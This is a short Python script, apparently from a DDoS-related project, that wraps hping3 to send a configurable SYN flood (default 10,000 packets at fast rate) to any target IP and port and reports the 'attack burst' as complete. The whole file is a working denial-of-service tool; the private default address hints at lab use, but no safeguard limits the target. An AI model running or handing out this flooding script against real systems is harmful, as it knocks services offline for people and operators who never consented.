#!/home/deep/files/arf_ddos/venv/bin/python
import argparse
import subprocess

DEFAULT_TARGET = '10.0.0.1'


def main():
	parser = argparse.ArgumentParser(description='Send a bounded SYN burst with hping3.')
	parser.add_argument('target', nargs='?', default=DEFAULT_TARGET)
	parser.add_argument('--count', type=int, default=10000)
	parser.add_argument('--port', type=int, default=80)
	args = parser.parse_args()
	if args.count < 1 or not 1 <= args.port <= 65535:
		parser.error('count must be positive and port must be between 1 and 65535')
	print(f'[SYN] sending {args.count} packets to {args.target}:{args.port}', flush=True)
	try:
		result = subprocess.run(
			['hping3', '-S', '-c', str(args.count), '--fast', '-p', str(args.port), args.target],
			check=False,
		)
	except FileNotFoundError:
		parser.error('hping3 is not installed; install it with: sudo apt-get install hping3')
	if result.returncode == 0:
		print('[SYN] attack burst complete', flush=True)
	else:
		print(f'[SYN] hping3 exited with status {result.returncode}', flush=True)


if __name__ == '__main__':
	main()
